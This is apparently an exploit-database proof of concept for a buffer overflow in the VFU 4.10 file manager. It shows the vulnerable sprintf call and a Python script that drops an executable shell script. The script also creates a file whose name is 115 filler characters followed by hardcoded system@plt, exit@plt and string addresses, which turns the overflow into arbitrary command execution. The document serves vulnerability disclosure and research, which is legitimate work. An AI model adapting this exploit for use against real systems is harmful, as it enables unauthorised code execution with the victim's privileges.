# Date: 2015-02-25
# Exploit Author: Bas van den Berg -- @barrebas
# Vendor Homepage: http://cade.datamax.bg/
# Software Link: http://cade.datamax.bg/vfu/#download
# Version: 4.10-1.1
# Tested on: GNU/Linux Kali 1.09 32-bit & Crunchbang 11 Waldorf (based on Debian Wheezy), kernel 3.2.0-4
 
# VFU 4.10 (probably up to 4.14) contains a buffer overflow when a user
# moves a file entry around with a large filename. To trigger this
# vulnerability, extensive user interaction is required.
# Steps to reproduce the bug: create a file with a large (>115
# characters), run VFU and select &#039;A&#039; and then &#039;V&#039; to move the large
# file entry around. Upon confirming the entry move, VFU crashes due to
# a buffer overflow in this function:
 
&#039;&#039;&#039;
void vfu_file_entry_move()
{
  char t[128];
  sprintf( t, "MOVE/REORDER File entry: %s", files_list[FLI]->name() );
  say1( t );
  say2( "Use Up/Down Arrows to reorder, ESC,ENTER when done." );
&#039;&#039;&#039;
 
# This overflow allows execution of arbitrary commands with the
# privilege of the current user. The attached PoC demonstrates this. It
# drops two files: the large filename and a shellscript that allows
# arbitrary command execution. Usage: $ python vfu-move-entry-poc.py
 
 
import struct
import os
 
def p(x):
    return struct.pack(&#039;<L&#039;, x & 0xffffffff)
 
with open(&#039;./vstring.h&#039;, &#039;w&#039;) as f:
    f.write(&#039;#!/bin/sh\ntouch pwned&#039;)
    f.close()
os.chmod(&#039;./vstring.h&#039;, 0755)
 
payload = "A"*115
payload += p(0x8049ca0) # system@plt
payload += p(0x804a260) # exit@plt
payload += p(0x8088e44) # -> ./vstring.h
 
open(payload, &#039;w&#039;).close()

